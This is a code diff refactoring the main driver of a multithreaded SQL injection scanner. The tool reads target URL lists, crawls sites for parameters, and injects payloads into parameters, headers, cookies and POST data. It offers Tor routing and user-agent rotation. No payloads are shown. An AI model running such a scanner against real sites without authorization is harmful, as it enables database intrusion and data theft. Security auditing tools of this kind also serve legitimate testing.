+                    _, filepath = payload_files[choice]
+                    custom_payloads = payload_manager.load_payloads_from_file(filepath)
+                    print(Fore.GREEN + f"[+] Loaded {len(custom_payloads)} payloads" + Style.RESET_ALL)
+                else:
+                    print(Fore.RED + "[-] Invalid number, reverting to mode 3" + Style.RESET_ALL)
+                    sqli_mode = 3
+            except ValueError:
+                print(Fore.RED + "[-] Error, reverting to mode 3" + Style.RESET_ALL)
+                sqli_mode = 3
     
-    global queries_done_global, total_queries_global
-    total_queries_global = total_links * (10) # Approximation
+    return {
+        "timeout": timeout,
+        "payload_delay": payload_delay,
+        "random_ua": random_ua_mode,
+        "ua_rotation_interval": ua_rotation_interval,
+        "scan_headers": scan_headers,
+        "scan_cookies": scan_cookies,
+        "scan_post": scan_post,
+        "gen_html": gen_html,
+        "sqli_mode": sqli_mode,
+        "custom_payloads": custom_payloads
+    }
+
+
+def load_urls(args) -> list:
+    """Loads URL list"""
+    if args.url:
+        return [args.url]
+    
+    try:
+        with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
+            urls = [line.strip() for line in f if line.strip()]
+        print(Fore.GREEN + f"[+] Loaded {len(urls)} URLs" + Style.RESET_ALL)
+        return urls
+    except FileNotFoundError:
+        print(Fore.RED + f"[-] File {args.input} not found!" + Style.RESET_ALL)
+        sys.exit(1)
+
+
+def _scan_single_url_task(scanner: SQLiScanner, thread_id: int, url: str, options: Dict) -> Dict:
+    """Worker function for ThreadPoolExecutor"""
+    scan_result = scanner.scan_url(
+        url,
+        payload_mode=options["sqli_mode"],
+        custom_payloads=options["custom_payloads"],
+        scan_headers=options["scan_headers"],
+        scan_cookies=options["scan_cookies"],
+        scan_post=options["scan_post"],
+        random_ua=options["random_ua"],
+        ua_rotation_interval=options["ua_rotation_interval"],
+        thread_id=thread_id,
+        expected_tests=options.get("expected_per_url", 0)
+    )
+    return scan_result
+
+
+def main():
+    """Main Entry Point"""
+    parser = argparse.ArgumentParser(
+        description="SQL Injection Audit Tool - Object-Oriented Version",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s -i urls.txt -o results.txt --threads 10
+  %(prog)s -u http://example.com -o result.txt --tor
+  %(prog)s -i urls.txt -o results.txt --crawl --depth 2
+        """
+    )
+    
+    parser.add_argument("-i", "--input", help="Input file with URLs (Light Scan: Params Only)")
+    parser.add_argument("-u", "--url", help="Single URL (Full Scan: Params, Headers, Cookies)")
+    parser.add_argument("-o", "--output", required=True, help="Output file (mandatory)")
+    parser.add_argument("--tor", action="store_true", help="Use Tor SOCKS5")
+    parser.add_argument("--threads", type=int, default=5, help="Thread count (1-50, default 5)")
+    parser.add_argument("--crawl", action="store_true", help="Crawl site for parameters")
+    parser.add_argument("--depth", type=int, default=1, help="Crawling depth (default 1)")
+    
+    args = parser.parse_args()
+    
+    # Startup Sequence
+    time.sleep(1.5)
+    print_banner()
+    time.sleep(3)
+    os.system('clear' if os.name != 'nt' else 'cls')
+
+    # Initialize options with default values
+    options = {
+        "timeout": 5,
+        "payload_delay": 0.0,
+        "random_ua": False,
+        "ua_rotation_interval": 5,
+        "scan_headers": False,
+        "scan_cookies": False,
+        "scan_post": False,
+        "gen_html": False,
+        "sqli_mode": 3,
+        "custom_payloads": []
+    }
+
+    if not validate_args(args):
+        sys.exit(1)
+    
+    if not args.crawl: # Only ask for user input if not in crawling mode
+        options.update(get_user_input_menu())
+    
+    if args.tor:
+        print(Fore.YELLOW + "[*] Testing Tor connection..." + Style.RESET_ALL)
+        # Use the timeout from options, or default if crawling
+        tor_timeout = options["timeout"] if not args.crawl else 5
+        temp_request_handler = SQLiScanner(use_tor=True, timeout=tor_timeout).request_handler
+        success, ip = temp_request_handler.test_tor_connection()
+        if success:
+            print(Fore.GREEN + f"[✓] Tor Connected: {ip}" + Style.RESET_ALL)
+        else:
+            choice = input(Fore.YELLOW + "[?] Continue without Tor? (yes/no): " + Style.RESET_ALL).lower()
+            if choice != 'yes':
+                print(Fore.RED + "[-] Scan aborted" + Style.RESET_ALL)
+                sys.exit(1)
+            args.tor = False
+    
+    if args.crawl:
+        print(Fore.CYAN + f"\n[*] Starting crawling..." + Style.RESET_ALL)
+        # Use the default timeout for crawling, as the menu was skipped
+        scanner_for_crawl = SQLiScanner(output_dir="outputs", timeout=options["timeout"], threads=1, use_tor=args.tor) 
+        urls = load_urls(args)
+        discovered = scanner_for_crawl.crawl_and_discover(urls, args.depth)
+        
+        if discovered:
+            output_path = os.path.join("outputs", args.output)
+            with open(output_path, 'w', encoding='utf-8') as f:
+                for url in sorted(discovered):
+                    f.write(url + "\n")
+            print(Fore.GREEN + f"[✓] Discovered {len(discovered)} links. Saved to: {output_path}" + Style.RESET_ALL)
+        else:
+            print(Fore.RED + "[-] No parameterized links discovered" + Style.RESET_ALL)
+        
+        sys.exit(0)
+    
+    urls = load_urls(args)
+    if not urls:
+        print(Fore.RED + "[-] No URLs to scan!" + Style.RESET_ALL)
+        sys.exit(1)
+
+    if not os.path.exists('payloads'):
+        os.makedirs('payloads')
+
+    payload_manager = PayloadManager(payloads_dir='payloads')
+    estimated_payloads = payload_manager.get_payloads_by_mode(
+        options["sqli_mode"], 
+        custom_payloads=options["custom_payloads"]
+    )
+    payload_count = len(estimated_payloads) if estimated_payloads else 1
+    
+    multiplier = 1 
+    if options["scan_headers"]:
+        multiplier += len(SQLiScanner.VULNERABLE_HEADERS)
+    if options["scan_cookies"]:
+        multiplier += 3 
+    if options["scan_post"]:
+        multiplier += 1
+
+    expected_per_url = (payload_count * multiplier) + 1 
+    options["expected_per_url"] = expected_per_url
+
+    scanner = SQLiScanner(
+        output_dir="outputs/results",
+        timeout=options["timeout"],
+        threads=args.threads,
+        use_tor=args.tor
+    )
+    scanner.global_delay = options["payload_delay"]
+    scanner.total_queries = len(urls) * expected_per_url
+
+    scanner.activity_logger.info(f"--- NEW SCAN SESSION STARTED: {len(urls)} URLs ---")
+
+    # --- UI LAYOUT ---
+    os.system('clear')
+    print(f"{Fore.CYAN}{Style.BRIGHT}  SQLi AUDITOR v2.0 - ACTIVE SESSION{Style.RESET_ALL}")
+    print(f"  {'─'*60}")
+    print(f"  {Fore.YELLOW}TARGETS: {Fore.WHITE}{len(urls)} URLs  {Fore.YELLOW}THREADS: {Fore.WHITE}{args.threads}")
+    print(f"  {Fore.YELLOW}VECTORS: {Fore.WHITE}Header:{options['scan_headers']} Cookie:{options['scan_cookies']} POST:{options['scan_post']}")
+    print(f"  {Fore.YELLOW}TIMEOUT: {Fore.WHITE}{options['timeout']}s  {Fore.YELLOW}DELAY: {Fore.WHITE}{options['payload_delay']}s")
+    print(f"  {'─'*60}")
+    print("\n") 
+    print(f"  {Fore.CYAN}{Style.BRIGHT}ACTIVE THREADS STATUS:{Style.RESET_ALL}")
+    print(f"  {Fore.BLUE}{'═'*80}{Style.RESET_ALL}")
+
+    scanner._initialize_ui_area()
+    scanner.start_ui()
+
+    time.sleep(2)
+    
+    scanned_count = 0
+    vulnerable_count = 0
 
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        for idx, link in enumerate(links, 1):
-            domain = get_domain(link)
-            session = get_session_with_config(use_tor, args.random_agent, 5)
-            current_ua = random.choice(list(UA_DICT.values()))
-            
-            print_header(idx, total_links, queries_done_global, total_queries_global, link)
-            waf = detect_waf(session, link, 5, current_ua)
-            tech = "Generic"
-            try:
-                res = session.get(link, timeout=5)
-                tech = detect_tech_from_headers(res.headers)
-            except: pass
-            
-            check_sqli(session, link, 5, sqli_mode, current_ua, custom_payloads, domain, idx, total_links, len(custom_payloads), threads=args.threads, scan_headers=scan_headers, scan_cookies=scan_cookies, scan_post=scan_post, detected_tech=tech)
+        futures = {}
+        for i, url in enumerate(urls):
+            thread_id = i % args.threads 
+            futures[executor.submit(_scan_single_url_task, scanner, thread_id, url, options)] = url
 
-    print_statistics_summary()
-    if gen_html:
-        generate_html_report(final_output_path + ".html", vulnerabilities_data, stats_vulnerability_types, stats_effective_payloads)
-    print(Fore.GREEN + "\n[✓] Audit Completed Successfully.")
+        for future in as_completed(futures):
+            try:
+                scan_result = future.result()
+                scanned_count += 1
+                if scan_result["sqli_found"]:
+                    vulnerable_count += scan_result["vulnerabilities_count"]
+            except Exception as e:
+                url = futures[future]
+                scanned_count += 1
+                scanner._update_thread_ui(0, f"{Fore.RED}[CRITICAL] Error {url}: {str(e)[:40]}")
+
+    scanner.stop_ui()
+    
+    sys.stdout.write(f"\033[{SQLiScanner.HEADER_HEIGHT + SQLiScanner.LINES_PER_THREAD * args.threads + scanner.event_log_max + 2};1H")
+    sys.stdout.flush()
+
+    print(Fore.CYAN + Style.BRIGHT + "\n" + "═"*60)
+    print(Fore.CYAN + Style.BRIGHT + "║" + " "*18 + "SCANNING FINISHED" + " "*25 + "║")
+    print(Fore.CYAN + Style.BRIGHT + "═"*60)
+    
+    print(Fore.GREEN + f"\n[✓] Scanned: {scanned_count} URLs")
+    print(Fore.GREEN + f"[✓] Vulnerabilities: {vulnerable_count}")
+    scanner.activity_logger.info(f"SCAN FINISHED. Found {vulnerable_count} vulnerabilities across {scanned_count} URLs.")
+    
+    scanner.statistics.print_summary()
+    
+    if options["gen_html"]:
+        report_gen = ReportGenerator("outputs")
+        stats = scanner.statistics
+        html_path = os.path.join("outputs", args.output.rsplit('.', 1)[0] + ".html")
+        report_gen.generate_html_report(
+            html_path,
+            stats.get_vulnerabilities_data(),
+            stats.get_vulnerability_types(),
+            stats.get_effective_payloads()
+        )
+    
+    print(Fore.YELLOW + f"\n[*] Reports in: outputs/" + Style.RESET_ALL)
+    print(Fore.CYAN + Style.BRIGHT + "═"*60 + Style.RESET_ALL + "\n")
+
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Fore.RED + Style.BRIGHT + "\n\n[!] Interrupted by user" + Style.RESET_ALL)
+        sys.exit(0)
+    except Exception as e:
+        print(Fore.RED + Style.BRIGHT + f"\n[!] Critical Error: {e}" + Style.RESET_ALL)
+        sys.exit(1)
